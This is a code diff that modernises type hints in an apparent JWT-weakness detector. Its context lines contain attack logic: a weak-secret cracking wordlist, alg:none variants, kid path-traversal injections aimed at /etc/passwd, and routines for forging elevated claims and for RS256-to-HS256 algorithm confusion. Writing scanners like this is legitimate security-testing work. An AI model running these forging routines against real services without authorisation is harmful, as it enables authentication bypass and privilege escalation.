@@ -27,13 +27,12 @@ import hashlib
 import hmac
 import json
 import re
-from typing import Any, Dict, List, Optional, Tuple
+from typing import Any
 
-from titan.core.models import Finding, Severity, AttackType
-
+from titan.core.models import AttackType, Finding, Severity
 
 # ── Expanded weak-secret wordlist ──────────────────────────────────────────────
-WEAK_SECRETS: List[str] = [
+WEAK_SECRETS: list[str] = [
     # Top observed secrets from public sources
     "secret", "password", "123456", "changeme", "jwt_secret", "supersecret",
     "test", "key", "your-256-bit-secret", "secretkey", "titan", "mysecret",
@@ -84,12 +83,12 @@ WEAK_SECRETS: List[str] = [
 ]
 
 # alg:none variants
-_ALG_NONE_VARIANTS: Tuple[str, ...] = (
+_ALG_NONE_VARIANTS: tuple[str, ...] = (
     "none", "None", "NONE", "nOnE", "null", "NULL", "Null",
     "", " ", "HS256 ", "RS256 ", "ES256 ", "PS256 ",
 )
 # kid injection values
-_KID_INJECTIONS: Tuple[str, ...] = (
+_KID_INJECTIONS: tuple[str, ...] = (
     "../../dev/null",
     "../../../../../../dev/null",
     "../../../../../../etc/passwd",
@@ -110,7 +109,7 @@ _KID_INJECTIONS: Tuple[str, ...] = (
 class JWTDetector:
     """Production-grade JWT weakness detector."""
 
-    def __init__(self, payload_smith, fingerprint: Dict[str, Any]):
+    def __init__(self, payload_smith, fingerprint: dict[str, Any]):
         self.payload_smith = payload_smith
         self.fingerprint = fingerprint
         self.interactsh = fingerprint.get("interactsh")
@@ -125,9 +124,9 @@ class JWTDetector:
         target: str,
         method: str,
         url: str,
-        params: Dict[str, str],
-    ) -> List[Finding]:
-        findings: List[Finding] = []
+        params: dict[str, str],
+    ) -> list[Finding]:
+        findings: list[Finding] = []
 
         # A protected endpoint rejects unauthenticated access — that's the
         # baseline proving a forged token was actually accepted.
@@ -186,7 +185,7 @@ class JWTDetector:
                         findings.append(self._finding(
                             target, url, method, "Authorization",
                             f"JWT weak secret cracked: '{cracked}'",
-                            f"HS256 forged with cracked secret",
+                            "HS256 forged with cracked secret",
                             Severity.CRITICAL, 0.97, resp2, body,
                             [f"jwt:weak_secret_cracked:{cracked}"],
                         ))
@@ -291,7 +290,7 @@ class JWTDetector:
         }).encode())
         return f"{header}.{payload}."
 
-    def _forge_with_header(self, header_dict: Dict, token: str, secret: str) -> str:
+    def _forge_with_header(self, header_dict: dict, token: str, secret: str) -> str:
         parts = token.split(".")
         header_b64 = self._b64(json.dumps(header_dict).encode())
         payload_b64 = parts[1] if len(parts) > 1 else self._b64(b"{}")
@@ -303,14 +302,14 @@ class JWTDetector:
             sig_b64 = ""
         return f"{header_b64}.{payload_b64}.{sig_b64}"
 
-    def _extract_token(self, body: str) -> Optional[str]:
+    def _extract_token(self, body: str) -> str | None:
         m = re.search(
             r"[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,}",
             body or ""
         )
         return m.group(0) if m else None
 
-    def _crack_secret(self, token: str) -> Optional[str]:
+    def _crack_secret(self, token: str) -> str | None:
         parts = token.split(".")
         if len(parts) != 3 or not parts[2]:
             return None
@@ -350,7 +349,7 @@ class JWTDetector:
         sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
         return f"{header_b64}.{payload_b64}.{self._b64(sig)}"
 
-    def _forge_elevated_claims(self, token: str) -> Optional[str]:
+    def _forge_elevated_claims(self, token: str) -> str | None:
         """Forge elevated claims with empty signature (for no-sig-check test)."""
         parts = token.split(".")
         if len(parts) < 2:
@@ -364,11 +363,11 @@ class JWTDetector:
         except Exception:
             return None
 
-    def _rs256_to_hs256(self, token: str, pubkey_pem: str) -> Optional[str]:
+    def _rs256_to_hs256(self, token: str, pubkey_pem: str) -> str | None:
         """Sign token with public key bytes as HMAC secret (algorithm confusion)."""
         return self._algo_confuse_token(token, pubkey_pem, "HS256")
 
-    def _algo_confuse_token(self, token: str, secret: str, target_alg: str) -> Optional[str]:
+    def _algo_confuse_token(self, token: str, secret: str, target_alg: str) -> str | None:
         """Re-sign token with given secret using target_alg (algorithm confusion)."""
         try:
             parts = token.split(".")
@@ -395,7 +394,7 @@ class JWTDetector:
 
     async def _fetch_public_key(
         self, context, target: str, url: str
-    ) -> Optional[str]:
+    ) -> str | None:
         """Try to fetch a public key from common JWKS endpoints."""
         from urllib.parse import urlparse
         parsed = urlparse(url)
